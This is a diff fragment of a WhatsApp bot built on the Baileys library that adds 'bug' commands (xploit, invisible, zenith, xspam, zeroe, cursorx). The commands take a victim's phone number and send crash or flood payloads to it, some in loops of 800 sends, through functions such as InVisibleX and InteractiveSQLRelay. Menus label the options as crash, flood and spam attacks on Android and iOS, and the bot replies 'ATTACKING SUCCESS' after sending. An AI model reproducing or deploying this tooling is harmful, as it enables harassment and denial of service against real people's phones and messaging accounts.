+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐆͢𝐋𝐗͢𝐂𝐋༑',
+							id: `Glxcl ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐕𝐃͢𝚵𝐗༑',
+							id: `Vdex ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐈𝐎͢𝐍ͯ𝐒͢𝐐𝐋༑',
+							id: `Ion ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝚯𝐕𝐃 ⌟',
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐅𝐥͢𝐨ͮ𝐰༑',
+							id: `Flowinfinite ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐈𝐯ͯ͢𝐒༑',
+							id: `Invisixflods ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐔ͯ͢𝐈༑',
+							id: `Infiniteui ${incTarget}`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐓͢𝐫𝐚ͯ͢𝐬𝐡 𝐔ͯ͢𝐈༑',
+							id: `Trashui ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐋𝚯𝚯𝐏 ⌟',
+						highlight_label: "🎭⃟༑⌁⃰𝐅𝐥͢𝐨ͯ𝐨ͦ͢𝐝𝐬ͮཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝐏𝐚ͮ͢𝐢𝐫༑',
+							id: `Spampair ${incTarget}|150`
+						}]
+					},
+					{
+						highlight_label: "🎭⃟༑⌁⃰𝐅𝐥͢𝐨ͯ𝐨ͦ͢𝐝𝐬ͮཀ͜͡🐉",
+						rows: [{
+							title: '⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝐎͢𝐭ͯ𝐩༑',
+							id: `Tempban ${q}`
+						}]
+					}
+				]
+
+				let listMessage = {
+					title: `𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸`,
+					sections
+				};
+
+				let msg = generateWAMessageFromContent(m.chat, {
+					viewOnceMessage: {
+						message: {
+							"messageContextInfo": {
+								"deviceListMetadata": {},
+								"deviceListMetadataVersion": 2
+							},
+							interactiveMessage: proto.Message.InteractiveMessage.create({
+								contextInfo: {
+									mentionedJid: [m.sender],
+									isForwarded: true,
+									forwardingScore: 999,
+									forwardedNewsletterMessageInfo: {
+										newsletterJid: global.xchannel.jid,
+										newsletterName: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉️',
+										serverMessageId: -1
+									},
+									businessMessageForwardInfo: {
+										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+									},
+								},
+								body: proto.Message.InteractiveMessage.Body.create({
+									text: ''
+								}),
+								footer: proto.Message.InteractiveMessage.Footer.create({
+									text: `⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟  ⿻`
+								}),
+								header: proto.Message.InteractiveMessage.Header.create({
+									title: `\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
+									subtitle: `️`,
+									hasMediaAttachment: true,
+									...(await prepareWAMessageMedia({
+										image: {
+											url: thumbSky
+										}
+									}, {
+										upload: VxoZap.waUploadToServer
+									}))
+								}),
+								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+									buttons: [{
+										"name": "single_select",
+										"buttonParamsJson": JSON.stringify(listMessage)
+									}, ]
+								})
+							})
+						}
+					}
+				}, {})
+
+				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+					messageId: msg.key.id
+				})
+			}
+			break
+			case 'xploit': {
+				if (!isCreator) return zreply(mess.owner)
+				if (!q) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let target = incTarget + '@s.whatsapp.net'
+				global.jumlah = text.split("|")[1]
+
+				let sections = [{
+						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
+						rows: [{
+							title: '⌁⃰𝐂𝐮𝐫𝐬𝐨𝐫𝐒𝐐𝐋༑',
+							id: `Cursorsql ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐂𝐮𝐫𝐬𝐨𝐫𝐗༑',
+							id: `Cursorx ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐅𝐥𝐨𝐰༑',
+							id: `Cursorxflow ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐃𝐞𝐱༑',
+							id: `Cursorxpay ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐅𝐋𝚯𝐃 ⌟',
+						rows: [{
+							title: '⌁⃰𝐅𝐥𝐨𝐰 𝐗 𝐃𝐞𝐱༑',
+							id: `Flowxdex ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐌𝐬𝐠 𝐅𝐥𝐨𝐰༑',
+							id: `Msgflow ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐌𝐬𝐠 𝐃𝐞𝐱༑',
+							id: `Msgpayload ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝚯𝐕𝐑 ⌟',
+						rows: [{
+							title: '⌁⃰𝐔𝐢𝐂𝐫𝐚𝐬𝐡༑',
+							id: `Uicrash ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐎𝐧𝐞𝐔𝐢༑',
+							id: `Oneui ${incTarget}`
+						}]
+					},
+					{
+						title: '⌜ 𝐈𝚯𝐒 ⌟',
+						rows: [{
+							title: '⌁⃰𝐕𝐨𝐢𝐝𝐅𝐥𝐮𝐱 𝐈𝐨𝐒༑',
+							id: `Void ${incTarget}`
+						}]
+					},
+					{
+						rows: [{
+							title: '⌁⃰𝐇𝐨𝐥𝐝𝐊𝐞𝐲 𝐈𝐨𝐒༑',
+							id: `Fluxa ${incTarget}`
+						}]
+					}
+				];
+
+				let listMessage = {
+					title: `𝐕𝐗𝚯 ☇ 𝐙𝐀𝚸`,
+					sections
+				};
+
+				let msg = generateWAMessageFromContent(m.chat, {
+					viewOnceMessage: {
+						message: {
+							"messageContextInfo": {
+								"deviceListMetadata": {},
+								"deviceListMetadataVersion": 2
+							},
+							interactiveMessage: proto.Message.InteractiveMessage.create({
+								contextInfo: {
+									mentionedJid: [m.sender],
+									isForwarded: true,
+									forwardingScore: 999,
+									forwardedNewsletterMessageInfo: {
+										newsletterJid: global.xchannel.jid,
+										newsletterName: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉️',
+										serverMessageId: -1
+									},
+									businessMessageForwardInfo: {
+										businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+									},
+								},
+								body: proto.Message.InteractiveMessage.Body.create({
+									text: ''
+								}),
+								footer: proto.Message.InteractiveMessage.Footer.create({
+									text: `⿻  ⌜ 𝐆𝐞𝐭𝐬𝐮𝐳𝐨 ⌟  ⿻`
+								}),
+								header: proto.Message.InteractiveMessage.Header.create({
+									title: `\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
+									subtitle: `️`,
+									hasMediaAttachment: true,
+									...(await prepareWAMessageMedia({
+										image: {
+											url: thumbSky
+										}
+									}, {
+										upload: VxoZap.waUploadToServer
+									}))
+								}),
+								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+									buttons: [{
+										"name": "single_select",
+										"buttonParamsJson": JSON.stringify(listMessage)
+									}, ]
+								})
+							})
+						}
+					}
+				}, {})
+
+				await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+					messageId: msg.key.id
+				})
+			}
+			break
+
+			// NEW BUG ©2025 \\
+			//=================================================//
+			case 'invisible': {
+								if (!isPremium) return m.reply(mess.premium)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : InVisible Number_\n_Example : InVisible 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
 				let {
 					proto,
 					generateWAMessageFromContent
 				} = require('@whiskeysockets/baileys')
 				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
-				if (incTarget.startsWith('0')) return zreply(`*Syntax Error!*\n\n_Use : ION Number_\n_Example : ION 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️`)
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : InVisible Number_\n_Example : InVisible 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
 				let X = incTarget + '@s.whatsapp.net';
 				if (owner.includes(incTarget)) {
-					zreply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
 				} else {
 					zreply(mess.bugrespon)
 					global.jumlah = text.split("|")[1]
 					for (let i = 0; i < 1; i++) {
-						await StuckSql(X, GetsuZo, Ptcp = true)
+						await InVisibleX(X, false)						
 					}
 					let msg = generateWAMessageFromContent(m.chat, {
 						viewOnceMessage: {
@@ -6028,7 +7092,7 @@ break
 										forwardingScore: 999,
 										forwardedNewsletterMessageInfo: {
 											newsletterJid: global.xchannel.jid,
-											newsletterName: '🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️',
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
 											serverMessageId: -1
 										},
 										businessMessageForwardInfo: {
@@ -6039,7 +7103,1600 @@ break
 										text: ''
 									}),
 									footer: proto.Message.InteractiveMessage.Footer.create({
-										text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗜𝗻𝗩𝗶𝘀𝗶𝗯𝗹𝗲`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"Invisible ${incTarget}\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'zenoth': {
+								if (!isPremium) return m.reply(mess.premium)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : Zenith Number_\n_Example : Zenith 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : Zenith Number_\n_Example : Zenith 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]					
+					for (let i = 0; i < 800; i++) {
+						await InVisibleX(X, false)						
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆 𝗜𝗻𝗩𝗶𝘀𝗶𝗯𝗹𝗲`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'zenith': {
+								if (!isPremium) return m.reply(mess.premium)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : Zenith Number_\n_Example : Zenith 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : Zenith Number_\n_Example : Zenith 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]					
+					for (let i = 0; i < 1; i++) {
+						await sendMessagesForDuration(24, X)						
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆 𝗜𝗻𝗩𝗶𝘀𝗶𝗯𝗹𝗲`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'xspam': {
+								if (!isPremium) return m.reply(mess.premium)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : Zenith Number_\n_Example : Zenith 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : Zenith Number_\n_Example : Zenith 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]					
+					for (let i = 0; i < 800; i++) {
+						await DelayInVis(X, false)
+						await EpHemeral(X)						
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗗𝗲𝗹𝗮𝘆 𝗜𝗻𝗩𝗶𝘀𝗶𝗯𝗹𝗲`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			case 'zeroe': {
+								if (!isPremium) return m.reply(mess.premium)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : Zero Number_\n_Example : Zero 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : Zero Number_\n_Example : Zero 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1; i++) {
+						await sendMessagesForDurationX(24, X)						
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
+											newsletterName: '🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️',
+											serverMessageId: -1
+										},
+										businessMessageForwardInfo: {
+											businessOwnerJid: VxoZap.decodeJid(VxoZap.user.id)
+										},
+									},
+									body: proto.Message.InteractiveMessage.Body.create({
+										text: ''
+									}),
+									footer: proto.Message.InteractiveMessage.Footer.create({
+										text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
+									}),
+									header: proto.Message.InteractiveMessage.Header.create({
+										title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${X.split("@")[0]}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗭𝗲𝗿𝗼 𝗜𝗻𝗩𝗶𝘀𝗶𝗯𝗹𝗲`,
+										subtitle: "",
+										hasMediaAttachment: true,
+										...(await prepareWAMessageMedia({
+											image: {
+												url: thumbSky
+											}
+										}, {
+											upload: VxoZap.waUploadToServer
+										}))
+									}),
+									nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+										buttons: [{
+											"name": "quick_reply",
+											"buttonParamsJson": `{\"display_text\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"id\":\"\"}`
+										}, ],
+									})
+								})
+							}
+						}
+					}, {})
+
+					await VxoZap.relayMessage(msg.key.remoteJid, msg.message, {
+						messageId: msg.key.id
+					});
+					await taskdone(finishmoji)
+				}
+			}
+			break
+			
+			case 'cursorx': {
+				if (!isCreator) return m.reply(mess.owner)
+				if (!q) return m.reply(`*Syntax Error!*\n\n_Use : CursorX Number_\n_Example : CursorX 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`);
+				let {
+					proto,
+					generateWAMessageFromContent
+				} = require('@whiskeysockets/baileys')
+				incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+				if (incTarget.startsWith('0')) return m.reply(`*Syntax Error!*\n\n_Use : TrashFlow Number_\n_Example : TrashFlow 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`)
+				let X = incTarget + '@s.whatsapp.net';
+				if (owner.includes(incTarget)) {
+					m.reply('𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!')
+				} else {
+					zreply(mess.bugrespon)
+					global.jumlah = text.split("|")[1]
+					for (let i = 0; i < 1; i++) {
+						await InteractiveSQLRelay(X, null, 77777)
+						await InteractiveSQLRelay(X, CrSqlF)
+						await InteractiveSQLRelay(X, CrSql)
+					}
+					let msg = generateWAMessageFromContent(m.chat, {
+						viewOnceMessage: {
+							message: {
+								"messageContextInfo": {
+									"deviceListMetadata": {},
+									"deviceListMetadataVersion": 2
+								},
+								interactiveMessage: proto.Message.InteractiveMessage.create({
+									contextInfo: {
+										mentionedJid: [m.sender],
+										isForwarded: true,
+										forwardingScore: 999,
+										forwardedNewsletterMessageInfo: {
+											newsletterJid: global.xchannel.jid,
